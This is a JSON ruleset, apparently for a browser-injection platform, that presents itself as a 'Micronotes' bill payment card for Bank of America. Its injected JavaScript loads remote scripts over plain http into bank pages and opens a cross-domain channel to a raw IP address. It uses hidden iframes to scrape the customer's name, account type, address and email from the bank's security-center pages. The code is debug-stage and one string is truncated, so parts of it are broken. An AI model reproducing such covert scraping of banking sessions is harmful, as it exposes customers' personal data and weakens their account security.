{
   "dispatch": [
      {"domain": "www.micronotes.info"},
      {"domain": "bankofamerica.com"}
   ],
   "global": [{"emit": "\nalert(\"test BOA\");    Micronotes = {};    Micronotes.Modes = {        DEBUG: 0,        RELEASE: 1    };        Micronotes.Util = {        mode: Micronotes.Modes.DEBUG,        timeBegin:new Date(),        remote:null,        init: function(){            $K.getScript(\"http://www.micronotes.info/ErrorHandling/jquery-1.3.2.min.js\");             $K.getScript(\"http://www.micronotes.info/ErrorHandling/jquery-ui-1.7.2.custom.min.js\");             $K.getScript(\"http://www.micronotes.info/ErrorHandling/json2.js\");            $K.getScript(\"http://www.micronotes.info/ErrorHandling/easyXDM.min.js\", Micronotes.Util.initChannel);            },        initChannel:function(){            easyXDM.DomHelper.requiresJSON(\"../json2.js\");            console.log(\"%s: %o\", 'easyXDM', easyXDM);            Micronotes.Util.remote = new easyXDM.Interface({                  local: \"/hash.html\",                  remote: \"http://173.1.49.212/EasyXSSDemo/example/remotemethods.html\",                  }, {                  remote: {                    add: {},                    multiplyNumbers: {},                    noOp: {                         isVoid: true                    }                  },                  local: {                     alertMessage: {                          method: function(msg){                            alert(msg);                          },                          isVoid: true                     }                    }                  }, function(){                        Micronotes.Util.remote.noOp();                  });        },        log: function(id, obj) {            if (this.mode == Micronotes.Modes.DEBUG) {                var myConsole = console ? console : window.console ? window.console : null;                if (myConsole) {                    console.log(\"%s: %o\", id, obj);                }            }        },        trim:function(msg){            return msg.replace(/^\\s+|\\s+$/g,\"\");        },        sendToParent:function(msg,url){            if(url){      \t\tMicronotes.Util.log('sendToParent:'+url,JSON.stringify(msg));            }else{                    msg.time=(new Date())-Micronotes.Util.timeBegin;                    alert(JSON.stringify(msg));               \t  \t}        },        sendToChildren:function(msg,url){    \tMicronotes.Util.log('sendToChildren:'+msg,url);        },        injectIFrame:function(id,url,callback){            if(callback){    \t     $K(\"body\").append('<div style=\"display:none\"><iframe width=\"700px\" height=\"500px\" id=\"'+id+'\"  src=\"'+url+'\" onload=\"'+callback+'()\"><\/div>');            }else{                 $K(\"body\").append('<div style=\"display:none\"><iframe width=\"700px\" height=\"500px\" id=\"'+id+'\"  src=\"'+url+'\"><\/div>');            }        }    };              jQuery.fn.log = function(msg) {        Micronotes.Util.log(\"%s: %o\", msg, this);        return this;    };    jQuery.fn.pause = function(duration) {        $(this).animate({ dummy: 1 }, duration);        return this;    };        var add=function(a, b){                    remote.addNumbers(a, b, function(result){                        alert(a + \" + \" + b + \" = \" + result);                    });                };                    var multiply = function(a, b){                    remote.multiplyNumbers(a, b, function(result){                        alert(a + \" x \" + b + \" = \" + result);                    });                 };    Micronotes.Util.init();                 "}],
   "meta": {
      "description": "\nMicronotes Bill Payment Card   \n",
      "logging": "off",
      "name": "Micronotes Card for Bank Of America"
   },
   "rules": [
      {
         "actions": [{"action": {
            "args": [],
            "modifiers": null,
            "name": "noop",
            "source": null
         }}],
         "blocktype": "every",
         "callbacks": null,
         "cond": {
            "type": "bool",
            "val": "true"
         },
         "emit": "\nMicronotes.Util.log(\"Page visited:\",document.location.href);         if(($K('title').html().indexOf('Bill Pay Center')!=-1) && (document.location.href.indexOf('#0')==-1)){          alert('Good');         \tvar accountPageUrl=$K(\".primaryNavCnt a:first\").attr(\"href\");         \tMicronotes.Util.injectIFrame('AccountsPage', 'http:    };          ",
         "foreach": [],
         "name": "bill_payment_center",
         "pagetype": {"event_expr": {
            "legacy": 1,
            "op": "pageview",
            "pattern": "https://bills.bankofamerica.com",
            "type": "prim_event",
            "vars": []
         }},
         "state": "active"
      },
      {
         "actions": [{"action": {
            "args": [],
            "modifiers": null,
            "name": "noop",
            "source": null
         }}],
         "blocktype": "every",
         "callbacks": null,
         "cond": {
            "type": "bool",
            "val": "true"
         },
         "emit": "\nif(top!=self){      Micronotes.Account={          name:null,         type:null,         address:{             street:null,             city:null,             state:null,             zip:null         },         email:null,      };     alert(\"1\");      Micronotes.DataMining={        isEmailSet:false,        isAddressSet:false,        onSecurityCenterLoad:function(){            var address_link=$K(\"#securityCenter\").contents().find(\"#Personal a:eq(1)\").attr(\"href\");            Micronotes.Util.injectIFrame('AddressPage',address_link,'Micronotes.DataMining.onAddressPageLoad');            var email_link=$K(\"#securityCenter\").contents().find(\"#Personal a:eq(0)\").attr(\"href\");            Micronotes.Util.injectIFrame('EmailPage',email_link,'Micronotes.DataMining.onEmailPageLoad');         },         onAddressPageLoad:function(){           var address=$K('#AddressPage').contents().find(\".txtAddDet:first\").html();           var raw = Micronotes.Util.trim(address);           address=Micronotes.Account.address;            address.street = Micronotes.Util.trim(raw.substring(0,raw.indexOf('<')));             address.city = Micronotes.Util.trim(raw.substring(raw.indexOf('>')+1,raw.indexOf(',')));            address.state = Micronotes.Util.trim(raw.substring(raw.indexOf(',')+1,raw.lastIndexOf(\"&nbsp;\")));           address.zip = Micronotes.Util.trim(raw.substring(raw.lastIndexOf(\"&nbsp;\")+6));            this.isAddressSet=true;           this.notifyFinish();          },         onEmailPageLoad:function(){            Micronotes.Account.email=Micronotes.Util.trim($K('#EmailPage').contents().find(\".SFtdtext1:first\").text());           var billpay_link=$K(\".primaryNavCnt a:eq(2)\").attr(\"href\");           this.isEmailSet=true;           Micronotes.Util.injectIFrame('billPayCenter', billpay_link+'#0', 'Micronotes.DataMining.notifyFinish');                     },         notifyFinish:function(){           if(this.isEmailSet && this.isAddressSet){               Micronotes.Util.sendToParent(Micronotes.Account);             }         }       };                  if($K('title').html().indexOf('Accounts Overview')!=-1){        Micronotes.Util.log(\"Page visited:\",document.location.href);        Micronotes.Account.name=trim($(\".title7new:first\").text().replace(/-.*$/,\"\"));        Micronotes.Account.type=trim($(\".title7new:first\").text().replace(/^.*-/,\"\"));        Micronotes.Util.injectIFrame('securityCenter',$K(\".cmslinknormal:first\").attr(\"href\"),    'Micronotes.DataMining.onSecurityCenterLoad');               }   }               ",
         "foreach": [],
         "name": "accounts_page",
         "pagetype": {"event_expr": {
            "legacy": 1,
            "op": "pageview",
            "pattern": "GotoWelcome",
            "type": "prim_event",
            "vars": []
         }},
         "state": "active"
      }
   ],
   "ruleset_name": "a69x4"
}
